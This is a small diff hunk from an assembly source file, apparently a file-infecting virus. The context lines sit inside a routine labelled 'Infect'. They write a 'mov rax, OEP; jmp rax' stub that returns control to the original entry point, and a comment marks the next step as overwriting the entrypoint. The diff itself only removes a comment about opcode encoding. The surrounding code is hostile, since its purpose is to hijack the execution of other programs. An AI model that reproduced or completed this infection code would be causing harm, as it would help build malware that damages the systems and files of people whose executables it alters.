@@ -281,7 +281,6 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
   mov   byte  [rbx + 10],   0xFF 
   mov   byte  [rbx + 11],   0xE0                        ; jmp rax
-  ; # maybe -> 48 c7 c0 <OEP>.. depending if we move a 64bit or a 32bit val
   
   ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
